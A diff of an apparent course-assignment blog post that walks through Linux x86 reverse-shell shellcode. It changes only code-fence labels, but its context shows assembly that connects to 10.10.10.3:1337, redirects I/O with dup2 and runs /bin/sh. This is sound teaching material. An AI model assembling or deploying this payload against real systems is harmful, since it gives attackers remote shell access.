@@ -49,7 +49,7 @@ Note that unlike the previous assignment, there is no need to call bind() or acc
 
 To start, I will clear the registers I plan to use:
 
-```x86asm
+```assembly
 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
@@ -62,7 +62,7 @@ int socket(int domain, int type, int protocol);
 
 As explained in the last post, I must submit a syscall() with the socketcall() identifier of `0x66` in `eax` and a socketcall function index of `0x1` for the socket() function in `ebx` as the first argument.
 
-```x86asm
+```assembly
 	mov al, 0x66  		; syscall: int socketcall()
 	mov bl, 0x1			; int socket()
 ```
@@ -70,7 +70,7 @@ As explained in the last post, I must submit a syscall() with the socketcall() i
 
 I then push the arguments of socket() to the stack and move the stack pointer (pointer to the arguments) into the second parameter of the syscall function in `ecx`:
 
-```x86asm
+```assembly
                     ; *args: push in reverse order to stack
 push 0x6			; protocol: IPPROTO_TCP (2)
 push 0x1			; type = SOCK_STREAM (1)
@@ -82,7 +82,7 @@ Since we are creating the same socket type (TCP) as in the bind shell exercise (
 
 Next I call the syscall and move the return value (a pointer to the newly created socket) into the `edi` register:
 
-```x86asm
+```assembly
 int 0x80
 mov edi, eax 		; store socket ptr to edi in edx
 ```
@@ -125,7 +125,7 @@ sin_family = AF_INET similar to the bind shell in assignment 1, this is used to 
 Finally, once the sockaddr_in structure is built on the stack, we will get a pointer to the structure on the stack and temporarily place it in `ecx`.
 
 The assembly for these operations is:
-```x86asm
+```assembly
 push 0x0a00020f		; IP = 10.10.10.3 (little endian)
 push word 0x3905	; num = '1337' (little endian)
 push word 0x02		; address family: AF_INET (2)
@@ -147,7 +147,7 @@ Then push the pointer to the open socket from before, currently stored in `edi`.
 Finally, load the stack pointer into `ecx` to be used as the second argument in the socketcall() and execute the syscall():
 
 
-```x86asm
+```assembly
 push byte 0x10		; 
 push ecx			; ptr to address struct
 push edi			; ptr to socket from socket() call
@@ -158,7 +158,7 @@ int 0x80
 
 Now we will redirect the I/O from STDIN/STDOUT/STDERR to/from the socket using the [dup2()](https://man7.org/linux/man-pages/man2/dup.2.html) function. This is the same as the bind shell in assignment 1, so I will spare the explination here:
 
-```x86asm
+```assembly
 	; dup2
 	mov ebx, edi		; mov file descriptor for socket to ebx
 
@@ -175,7 +175,7 @@ loop:
 
 Then, we call [execve()](https://man7.org/linux/man-pages/man2/execve.2.html) using "/bin/sh" as the path and two NULL values. This is the same set of operations from assignment 1, so again I will skip the explination.
 
-```x86asm
+```assembly
 ; Execute /bin/sh
 mov al, 0xb			; syscall: execve (11) int execve();
 
@@ -192,7 +192,7 @@ int 0x80			; execute execve
 ```
 
 The full assembly looks like this:
-```x86asm
+```assembly
 	; Filename: reverse_shell.nasm
 
 global _start
